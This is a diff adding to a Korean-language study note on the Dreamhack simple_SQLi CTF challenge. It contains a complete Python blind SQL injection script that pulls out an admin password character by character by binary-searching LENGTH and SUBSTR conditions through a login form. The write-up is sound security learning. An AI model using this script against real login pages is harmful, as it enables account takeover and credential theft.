@@ -160,4 +160,92 @@ res = query_db(f’select * from users where userid="{userid}" and userpassword=
 <br/>
 
 #### Blind SQL Injection: 관리자 계정의 비밀번호를 알아내고 올바른 경로로 로그인 하는 방법
+* 쿼리를 자동화하기 위해 로그인 요청의 폼 데이터 구조를 파악해야 함
+	- 로그인할 때 전송하는 POST 데이터의 구조를 파악하기 위해서 guest 계정으로 로그인할 때 전송되는 요청의 Form Data를 크롬 개발자 도구의 Network 탭에서 확인함
+		<img width="1296" alt="blindsqli_form data" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/e2099c48-3846-426c-ad04-607e78123bbc">
+		+ 로그인할 때 입력한 userid 값은 ```userid```로, password는 ```userpassword```로 전송됨을 확인할 수 있음
 
+* Blind SQL Injection 공격 자동화 스크립트(blind_sqli_exploit.py)
+```python
+#!/usr/bin/python3.9
+import requests
+import sys
+from urllib.parse import urljoin
+
+class Solver:
+    """Solver for simple_SQLi challenge"""
+    
+    # initialization
+    def __init__(self, port: str) -> None:
+        self._chall_url = f"http://host3.dreamhack.games:{port}" # port는 blind_sqli_exploit.py 코드 실행 시 입력함 (접속정보 확인)
+        self._login_url = urljoin(self._chall_url, "login")
+        
+    # base HTTP methods
+    def _login(self, userid: str, userpassword: str) -> requests.Response:
+        login_data = {
+            "userid": userid,
+            "userpassword": userpassword
+        }
+        resp = requests.post(self._login_url, data=login_data)
+        return resp
+    
+    
+    # base sqli methods
+    def _sqli(self, query: str) -> requests.Response:
+        resp = self._login(f"\" or {query}-- ", "hi")
+        return resp
+    
+    
+    def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:
+        while 1:
+            mid = (low+high) // 2
+            if low+1 >= high:
+                break
+            query = query_tmpl.format(val=mid)
+            if "hello" in self._sqli(query).text:
+                high = mid
+            else:
+                low = mid
+        return mid
+    
+    
+    # attack methods
+    
+    # 비밀번호의 길이 파악
+    def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:
+        query_tmpl = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\") < {{val}})"
+        pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len) # 이진 탐색 알고리즘을 활용하여 시간을 단축함
+        return pw_len
+    
+    
+    # 한 글자씩 비밀번호를 알아냄
+    def _find_password(self, user: str, pw_len: int) -> str:
+        pw = ''
+        for idx in range(1, pw_len+1):
+            query_tmpl = f"((SELECT SUBSTR(userpassword,{idx},1) WHERE userid=\"{user}\") < CHAR({{val}}))"
+            pw += chr(self._sqli_lt_binsearch(query_tmpl, 0x2f, 0x7e)) # 이진 탐색 알고리즘을 사용하여 시간을 단축하고 있음
+            print(f"{idx}. {pw}")
+        return pw
+    
+    
+    def solve(self) -> None:
+        # Find the length of admin password
+        pw_len = solver._find_password_length("admin")
+        print(f"Length of the admin password is: {pw_len}")
+        # Find the admin password
+        print("Finding password:")
+        pw = solver._find_password("admin", pw_len)
+        print(f"Password of the admin is: {pw}")
+        
+        
+if __name__ == "__main__":
+    port = sys.argv[1]
+    solver = Solver(port)
+    solver.solve()	
+```
+
+
+* Blind SQL Injection 수행 결과
+	<img width="1500" alt="blindsqli_result" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/44994f43-e77d-413d-8ddf-663137265244">
+	- 접속 정보
+		<img width="1058" alt="blindsqli_접속정보" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/10aee6e9-fb33-4afb-95ce-a45e069a97eb">
